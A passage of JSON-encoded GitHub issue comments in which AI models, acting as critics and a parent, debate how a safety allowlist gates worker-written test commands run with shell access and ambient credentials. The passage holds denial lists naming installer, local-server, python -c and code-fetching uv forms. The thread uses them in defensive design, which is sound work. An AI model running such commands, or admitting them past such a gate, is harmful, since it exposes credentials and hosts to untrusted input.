surfaces already in this tree:\n\n1. Add python and uv to the first-token set. The opened-token run rejects this. Those strings return ok, including the installer and server forms the package-manager grammar still denies.\n2. Keep the set closed and record task test, npm test, or pnpm test, which already return ok. This leaves the spawn surface unchanged. It does not execute pytest on the reported projects unless a task or package script already does, and init-deposit has no pytest stamp.\n3. Extend the existing vitest and npx subcommand grammar with a closed python -m pytest argv, and leave uv off the spawn set. That reuses evaluateVitestArgs and evaluatePackageManagerArgs.\n\n(2) becomes the remedy if a stamp already writes a verification verb whose body runs pytest for these consumer shapes. There is no such stamp under init-deposit. (1) becomes viable only if a grammar in front of the line 306 fallthrough refuses pip install, http.server, and uv run --with. The premise as written has no such grammar. Comment 5767179274 already refuses blanket uv approval.\n\nWorker-authored acceptance commands are the input. They spawn with shell true and the process environment, so this change decides what a swarm worker may spawn under ambient credentials. The control that already refuses npm install and npx registry packages is the subcommand grammar. That grammar has to stay in front of any python token.\n\n",
+          "id": 5769362886,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769362886",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T00:09:10Z",
+          "updated_at": "2026-09-22T00:09:10Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: parent\n```\n\n**Lean:** round-1 takes over the three critic posts.\n\nSpec-path:\n\nTarget-digest: sha256:fd6d5395b72aae02ecb4f3d810e1d7a376dcbb8e66174913de2dda514b81d95b\n\n## In plain English\n\nA Python project's pytest command is refused by the acceptance safety check before those tests run. A later report showed the same refusal for a uv command that installs packages and then runs pytest. The check's closed list is what stops a worker-written command from launching installers and network fetches with the agent's credentials.\n\nThe three critics agree the filed premise does not survive as worded. Adding python or uv as an open first word would also allow pip installs, a local server, and uv forms that fetch code. Confirming this map would bind a narrower contract: a closed pytest command shape, uv package-install forms still refused, and the same check applied when the command is written rather than only when the check runs. The underlying failure, a green pytest suite stopped by that safety reject, remains the pain this map covers.\n\nForward verdict: the recorded refutation-target does not survive as worded; the pytest safety-reject does. Disposition: the next-build contract is the bound remedy below. Non-self-arbitration: this parent also wrote the Stop 1 triage; the takes below accept critic headings and do not add a parent premise. This lean does not implement or close the issue.\n\n## Round\n\nround: 1\nsiblings: 3\nleaning-over: 5769333368, 5769345992, 5769362886\nsupersedes: 5769238290\n\n## Bound remedy\n\n- Do not add unrestricted first tokens python or uv to the execution allowlist. The joined premise does not survive.\n- A Python test command is a closed argv grammar in the style of the vitest and npx grammars: python -m pytest, or a pytest token, denying other interpreter modes and modules, with negative cases for pip install, http.server, and python -c.\n- uv run forms that resolve or install dependencies, including --with, stay refused, in the same class as the npx registry denial.\n- The stamp path runs the same first-token and argument check the run path runs, so a doomed command is refused where it is written.\n- The token set stays a static list in safety.ts. Runner detection may choose remediation text only and does not widen the set.\n- The same closed-grammar gap was measured for go test. That runner sits in this framing with pytest. It is not a detection-derived allowlist.\n- Acceptance commands still spawn with shell true and the process environment. This map records that residual and does not close it.\n- Bare deft check root inference stays with closed #4722.\n\n## Per-heading takes\n\n### Codex 5769333368\n\n- 1 joined premise that python or uv passes the current evaluator — accept-into-contract\n- 2 python -m pytest only as a command shape — accept-into-contract\n- 3 trust boundary is provenance plus launcher narrowing, not a sandbox — accept-into-contract\n\n### Claude 5769345992\n\n- 1 fused commands, uv half is the control working — accept-into-contract\n- 2 must-pass evaluateCommandSafety names the wrong mechanism location — accept-into-contract\n- 3 node-shaped runners, deft refuses its own recommended command — accept-into-contract\n- 4 stamp/run asymmetry — accept-into-contract\n\n### Grok 5769362886\n\n- 1 first-token admission spawns the installer — accept-into-contract\n- 2 pytest invocation and uv --with are different shapes — accept-into-contract\n\nResidual: none.\n\nrelieves: P1\n\n",
+          "id": 5769415118,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769415118",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T00:15:29Z",
+          "updated_at": "2026-09-22T00:15:29Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: claude-opus-5\n```quarantined\nrole: critic\n```\n\naudit-targets: pain-P1\n\nPain-audit of the bind lean 5769415118, graded against the Stop 1 denominator on 5769238290 and the Bound remedy list. Two of the four headings below are not blocking.\n\n## The one reject the Bound remedy refuses by design is inside the stamped pain\nblocks-the-design\n\n**Denominator.** Stop 1 defines P1 as the literal-AC safety reject over two named instances: `python -m pytest tests/test_new.py -q` (issue body, 0.119.1, Ubuntu 24.04 via WSL) and `uv run --no-project --with pytest --with pytest-cov --with pytest-mock --with playwright python -m pytest ...` (comment 5767179274, macOS, engine 0.119.6, exit 201). The wording is \"Comment 5767179274 adds the same reject for first token uv\". That folds the second instance into P1; it does not annex it as corroboration.\n\n`content/contracts/design-critique.md`, Pain coverage, Authority: \"The latest Stop 1 write-back (`design-critique: warranted, because ...` on `role: parent` or `role: triage`) owns the denominator. ... A superseding warrant is a new Stop 1, not last-writer prose elsewhere on the thread.\" The bind lean carries `supersedes: 5769238290` but no write-back clause, so it does not move the denominator. Its plain-English narrowing, \"the underlying failure, a green pytest suite stopped by that safety reject, remains the pain this map covers\", is last-writer prose over a denominator it cannot reach. Refuting the Stop 1 refutation-target is not the same act as shrinking the Stop 1 pain; the three critics did the first, and the lean is correct that the target does not survive.\n\n**Standard.** Same file: \"Cite `operator-deferred` only for unmet ids, and `relieves` only for ids the Bound-remedy actually covers.\"\n\n**Coverage check.** Bullet 2 covers instance one. Bullet 3, \"uv run forms that resolve or install dependencies, including --with, stay refused, in the same class as the npx registry denial\", is a verbatim match on instance two's recorded command. Bullet 1 declines unrestricted `uv`, bullet 5 keeps the token set a static list in `safety.ts`, and no bullet adds `uv` to that list. At 39c7fda the set is exactly nine tokens (task, deft, directive, pnpm, npm, npx, yarn, bun, vitest); `uv` is absent, so after this remedy every `uv` string still returns the line 275-279 first-token reject.\n\n**Failure mode.** Land the Bound remedy, then run `deft check` in the minnowScan project against the AC recorded in `xbrief/active/2026-09-21-visual-scan-report.xbrief.json`. `verify:ac` refuses on first token `uv`, exactly as filed, exit 201. Bullet 4 then moves that refusal earlier rather than removing it: at this SHA `evaluateStampAcceptanceSafety` (`safety.ts:205-235`) calls only `evaluateNoopDenylist` and never `evaluateCommandSafety`, which is why that `uv` line is admitted into `plan.acceptance.commands` today and dies at check time. For instance one, stamp-path parity is an improvement, because the command is admitted anyway. For instance two it converts a late red into an early red with no admitted substitute. Bullet 2 admits `python -m pytest` or a bare `pytest` token, and the recorded command's own `--no-project --with pytest` is the evidence that its pytest is supplied by uv rather than resolved from the interpreter on PATH; the grok critic separately checked that `init-deposit` stamps no `task` or `npm` verb whose body runs pytest for these consumer shapes. That reporter's Expected was two-pronged: a vetted Python/uv invocation supported by literal AC, **or** a documented and validated supported equivalent before a scope records a command the gate cannot run. The remedy delivers the earlier refusal and neither of the two things that let that consumer's loop terminate.\n\n**Why blocking and not sharpening.** Consequence, not bookkeeping. Under an operative relieves cite with `Residual: none`, instance two is recorded as covered and the closed cite forms leave nothing behind to catch it: uncited ids and `does-not-relieve` are what produce the `unrelieved-pain` residual heading. The deferral form needs a different issue id, and none exists. I searched open issues for this reject and found #4669 (mutation and swarm demanding uv, a different defect) and no filed leftover for the uv literal-AC refusal. So the bind as written retires a reporter-confirmed, exit-coded reject with no ledger entry against it.\n\n**Disposition.** I am not arguing the remedy should admit `uv run --with`. The codex and claude headings are right that it is the npx registry denial transposed to PyPI, and the reporter says the same in their own Expected. The defect is in the relief cite, not in the Bound remedy list, and the remedy list survives this heading unchanged. The structural reason no single closed cite fits is that Stop 1 stamped one id over two instances whose safety verdicts point in opposite directions: one is an over-block to be relieved, the other is the control working. That split is what needs a disposition the contract can represent, and picking between the leftover-issue path and a narrower re-stamp is the parent's call, not this seat's.\n\n**What would flip me.** If the uv instance leaves this arc's denominator through a filed leftover issue, or if finding 2 below is bound so a supported uv form actually exists, this heading drops and the Bound remedy list stands as written.\n\n## The harvest keeps the denial half of three accepted dispositions and drops the admission half\nsharpens-framing\n\nThe per-heading takes mark codex 1, codex 2, and claude 1 accept-into-contract. Each of those dispositions named an admission shape as well as a denial:\n\n- codex 1: \"A supported uv form needs an exact, fail-closed grammar that excludes dependency resolution/arbitrary launched binaries, or a separate constrained runner.\"\n- codex 2: \"scope the design to explicit interpreter aliases plus the exact `-m pytest` family\".\n- claude 1: \"If `uv` is admitted at all it needs its own argument grammar ... refuse any `uv run` carrying `--with`, `--with-requirements`, `--index`, `--index-url`, `--extra-index-url`, `--find-links` or `--refresh`, and require `--frozen` or `--no-sync` so resolution cannot reach the network.\"\n\nBound remedy bullet 3 encodes the refusal only. Bullet 2 names `python` and a `pytest` token; `python3` and `py` are absent from `ALLOWED_FIRST_TOKENS` at 39c7fda and absent from the remedy, and `python3` is the ordinary invocation on both reported hosts.\n\n**Failure mode.** A builder satisfies bullet 3 by leaving `uv` off the static set entirely, and satisfies bullet 2 by matching the literal token `python`. Both readings conform to the remedy as written. A macOS consumer then records `python3 -m pytest tests/` and reproduces this issue verbatim against the landed fix, while the uv grammar the panel converged on never gets written. The contrastive reading a builder will take from bullet 3, that non-resolving uv forms are therefore admitted, is bound nowhere.\n\n**Disposition.** Bind the admission half explicitly: the interpreter alias set as a list, and either the `uv run` grammar with the frozen or no-sync requirement plus the resolution-flag denial, or a bullet stating plainly that `uv` stays off the token set so no contrast is read into bullet 3. This changes the harvested Bound remedy rather than only its framing, so by the contract it belongs on a new bind lean, not on a takes comment.\n\n## The class extension names go test and not the node runner already filed\nfootnote\n\nBullet 6 pulls `go test` into the contract on claude heading 3, whose own evidence was that the executable-AC path admits only Node-shaped runners. #4751 is open: `verify:ac`: literal-AC allowlist rejects \"node --test\", failing check for standard Node test runner. `node` is absent from the nine-token set at 39c7fda, the same as `go` and `python`, so a standard Node runner is in the class too. The remedy's scope now runs past the P1 denominator in one direction while leaving a filed sibling of the same class unnamed. No weight on relief. Recorded so Stop 4 does not read \"the remedy landed\" as \"P1 is relieved\"; after bullet 6 those are two different questions with two different scopes.\n\n## The map reports residual twice with different answers\nfootnote\n\nBound remedy bullet 7 records one (\"Acceptance commands still spawn with shell true and the process environment. This map records that residual and does not close it\") and the takes section closes `Residual: none.` The narrow reading is that the takes line counts critic headings left untaken, which is nil, while the bullet records an arc residual, and both readings are available from the text as posted. Recorded because an auditor who reads only the takes line will not go looking for the instance in the first heading. Carries no disposition weight on its own.\n\n## Verdict\n\nThis audit returns one blocking finding, one sharpening finding that changes the harvested Bound remedy, and two footnotes. The operative relief cite on 5769415118 is not sound against the Stop 1 denominator: the Bound remedy covers the pytest reject and refuses the uv reject by design, and both are inside P1 as stamped. The Bound remedy list itself is sound and I am not asking for it to be loosened.\n\n",
+          "id": 5769466922,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769466922",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T00:22:01Z",
+          "updated_at": "2026-09-22T00:22:01Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: parent\n```\n\n**Lean:** retraction of the relief cite on 5769415118 after pain-audit 5769466922.\n\nSpec-path:\n\nTarget-digest: sha256:fd6d5395b72aae02ecb4f3d810e1d7a376dcbb8e66174913de2dda514b81d95b\n\nsupersedes: 5769415118\n\n## In plain English\n\nThe stamped pain covers two commands that the panel treated differently. One is python -m pytest, which a closed command shape can admit. The other is the uv command that installs packages and then runs pytest, which the same panel kept refused because it fetches code. The earlier map said that pain was covered. The pain-audit found the uv refusal is still inside the stamped pain, so the coverage cite does not hold. The closed pytest grammar stays the deliverable remainder. The uv refusal is the unmet part, and the honest path for that part is a separate issue. That split is not confirmed on this map.\n\nThe pain-audit also found the harvest kept the refusal half of the uv grammar and dropped the admission half, including interpreter aliases such as python3. That changes the remedy text. It is not bound here.\n\ndoes-not-relieve: P1\n\n",
+          "id": 5769480089,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769480089",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T00:23:41Z",
+          "updated_at": "2026-09-22T00:23:41Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: parent\n```\n\nopen-question: whether the uv literal-AC refusal that this remedy keeps refused is filed as its own issue, or a later warrant narrows the stamped pain to the pytest command only.\n\n",
+          "id": 5769480196,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769480196",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T00:23:42Z",
+          "updated_at": "2026-09-22T00:23:42Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: triage\n```\n\ndesign-critique: warranted, because the pytest safety-reject remains after the uv command moved to its own issue.\n\nmechanism-shaped: true\n\narc-mode: no-ingest\nyolo-standing: yes\ndest: C:\\Users\\msada\\.grok\\worktrees\\deft-directive\\issue-4702-dc\norigin-ref: origin/HEAD\ndispatch-sha: 39c7fda2ce57f02e7cdb90eb0200a7c4543f0978\n\ncharter: open critique\ncharter-why: post-handoff Stop 1 omits refutation-target\nspend: N≥3\nspend-ask: resolved\n\nDual-stop cap: 3 round-1 critic posts spent; reserved pain-audit spent; a further critic post needs a cap raise\n\ntarget: #4702\ntarget-shape: single-issue (default)\naudit-targets: none\n\npain: P1\n\n## Gate stamp\n\nP1 is the literal-AC safety reject of the pytest command shape: `python -m pytest`, and the same shape under the ordinary interpreter names `python3` and `py`. The closed argv grammar and the stamp-time check already recorded on successor lean 5769415118 are the remainder, with those two interpreter names included. `go test` stays out of this pain. `node --test` stays on #4751.\n\nThe uv command from comment 5767179274 is outside this denominator. Leftover issue #4849 was filed from this parent's issue-create output. Pain-audit 5769466922. Retraction 5769480089. Handoff 5769480196.\n\nPin-read at dispatch-sha 39c7fda2ce57f02e7cdb90eb0200a7c4543f0978 is unchanged: packages/core/src/literal-acceptance/safety.ts ALLOWED_FIRST_TOKENS lines 40-50 omit python, python3, py, pytest, and uv.\n\n",
+          "id": 5769541391,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769541391",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T00:30:50Z",
+          "updated_at": "2026-09-22T00:30:50Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: parent\n```\n\nDual-stop cap raised by the operator: one further critic post, the pain-audit of the bind lean for Stop 1 5769541391.\n\n",
+          "id": 5770003307,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5770003307",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T01:37:04Z",
+          "updated_at": "2026-09-22T01:37:04Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: parent\n```\n\n**Lean:** bind the narrowed pytest pain after leftover #4849 and Stop 1 5769541391.\n\nSpec-path:\n\nTarget-digest: sha256:fd6d5395b72aae02ecb4f3d810e1d7a376dcbb8e66174913de2dda514b81d95b\n\n## In plain English\n\nA Python project's pytest command is refused by the acceptance safety check before those tests run. The uv command that installs packages was moved to issue 4849. What remains is the pytest command itself, including the ordinary interpreter names python3 and py.\n\nConfirming this map binds a closed pytest command shape, those two interpreter names, and the same safety check when the command is written. The uv refusal stays on 4849.\n\nForward verdict: the narrowed pain is covered by that grammar. Disposition: the bound remedy below. Non-self-arbitration: this parent also wrote the Stop 1 triage; the takes below accept the round-1 critic headings and the interpreter-alias sharpening. This lean does not implement or close the issue.\n\n## Round\n\nsupersedes: 5769480089\nstop1: 5769541391\nleftover: 4849\ncap-raise: 5770003307\n\n## Bound remedy\n\n- A Python test command is a closed argv grammar in the style of the vitest and npx grammars: python -m pytest, python3 -m pytest, and py -m pytest, or a pytest token, denying other interpreter modes and modules, with negative cases for pip install, http.server, and python -c.\n- The stamp path runs the same first-token and argument check the run path runs, so a doomed command is refused where it is written.\n- The token set stays a static list in safety.ts. Runner detection may choose remediation text only.\n- The uv command that resolves or installs dependencies stays on #4849.\n- go test stays out of this remainder. node --test stays on #4751.\n- Acceptance commands still spawn with shell true and the process environment. This map records that residual.\n- Bare deft check root inference stays with closed #4722.\n\n## Per-heading takes\n\n### Codex 5769333368\n\n- 1 joined premise that python or uv passes the current evaluator — accept-into-contract\n- 2 python -m pytest only as a command shape — accept-into-contract\n- 3 trust boundary is provenance plus launcher narrowing, not a sandbox — accept-into-contract\n\n### Claude 5769345992\n\n- 1 fused commands, uv half is the control working — accept-into-contract\n- 2 must-pass evaluateCommandSafety names the wrong mechanism location — accept-into-contract\n- 3 node-shaped runners, deft refuses its own recommended command — accept-into-contract\n- 4 stamp/run asymmetry — accept-into-contract\n\n### Grok 5769362886\n\n- 1 first-token admission spawns the installer — accept-into-contract\n- 2 pytest invocation and uv --with are different shapes — accept-into-contract\n\n### Pain-audit 5769466922\n\n- 2 harvest the interpreter aliases python3 and py — accept-into-contract\n\nResidual: none.\n\nrelieves: P1\n\n",
+          "id": 5770003445,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5770003445",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T01:37:06Z",
+          "updated_at": "2026-09-22T01:37:06Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.6\n```quarantined\nrole: critic\n```\n\naudit-targets: pain-P1\n\nPain-audit of bind lean 5770003445 against Stop 1 5769541391 and that lean's Bound-remedy list.\n\n## Re-verification at 39c7fda2\n\nParsed ALLOWED_FIRST_TOKENS from packages/core/src/literal-acceptance/safety.ts at the dispatch SHA. The set is still the nine tokens task, deft, directive, pnpm, npm, npx, yarn, bun, vitest. python, python3, py, pytest, and uv are absent. The issue-body commands python -m pytest tests/test_new.py -q and python -m pytest tests/test_list.py -q still refuse on first token, and the same shape under python3 and py refuses the same way. safety-branches.test.ts still locks python -m pytest to ok false.\n\nevaluateStampAcceptanceSafety still calls evaluateNoopDenylist and does not call evaluateCommandSafety. Leftover #4849 is open, carries the uv run --with command from comment 5767179274, and keeps the python -m pytest shape on #4702. The lean's digest matches the live REST issue body hash fd6d5395b72aae02ecb4f3d810e1d7a376dcbb8e66174913de2dda514b81d95b.\n\n## The narrowed P1 is the grammar the Bound remedy names\n\nStop 1 owns the denominator. P1 is the literal-AC safety reject of python -m pytest, python3 -m pytest, and py -m pytest. The uv command from 5767179274 is outside that denominator. go test stays out. node --test stays on #4751. The remainder is the closed argv grammar and the stamp-time check, with those two interpreter names included.\n\nBound-remedy bullet 1 names those three interpreter shapes, denies other interpreter modes and modules, and lists negative cases for pip install, http.server, and python -c. Bullet 2 is the stamp-path parity Stop 1 named. Bullet 4 parks the uv command on #4849. That is coverage of the stamped id. The prior blocking heading on 5769466922 flipped if the uv instance left the denominator through a filed leftover; that leftover is #4849, and this Stop 1 records it.\n\nInjection / swarm lens fires because the harvest changes an untrusted-input-to-execution surface. Stored commands may originate from issue text and still spawn with shell true and process.env. Adding python, python3, or py as first tokens with no argv grammar would admit python -m pip install and python -m http.server; the harvest requires that grammar and those negative cases. uv run --with stays the npx-registry class on #4849. The lens does not add a heading.\n\nThe relief cite on 5770003445 is sound against this Stop 1 and this Bound-remedy list.\n\n## Takes still accept the go heading the harvest now excludes\nfootnote\n\nThe takes still mark Claude 5769345992 heading 3 accept-into-contract. That heading's disposition was executable literal AC as a Node-shaped-runner gap, with pytest and go in the same class. Bound-remedy bullet 5 now keeps go test out of this remainder and parks node --test on #4751, which matches Stop 1. A reader of the takes line alone will think go is in the harvest. The Bound-remedy list is the harvest, and it already matches the denominator. No weight on the relief cite.\n\n## Residual none and the recorded shell residual\nfootnote\n\nBound-remedy bullet 6 records that acceptance commands still spawn with shell true and the process environment. The takes section closes Residual: none. The narrow reading is that the takes line counts critic headings left untaken, while the bullet records an arc residual. Same shape as the prior audit's last footnote. No weight on the relief cite.\n\n## Extra pytest token sits outside this P1\nfootnote\n\nStop 1 names the interpreter -m pytest family. Bullet 1 also admits a pytest token. Doctor's pytest --testmon string is still refused at this SHA and is not in the stamped pain. Extra admission does not leave the three interpreter shapes uncovered. Harvest unchanged.\n\n## Verdict\n\nThis audit returns no blocking finding and no sharpening finding. Three footnotes. The operative relief cite on 5770003445 is sound. The Bound-remedy list can bind as written.\n\nRoad not taken: treat the dropped unrestricted-python-or-uv bullet from 5769415118 as a P1 hole. That work now sits in the closed grammar and in leftover #4849. What would flip me: Stop 1 putting the uv command back in P1, or a Bound-remedy that admits python without the -m pytest grammar and those negative cases.",
+          "id": 5770062491,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5770062491",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T01:45:28Z",
+          "updated_at": "2026-09-22T01:45:28Z",
+          "author_association": "MEMBER"
+        },
+        {
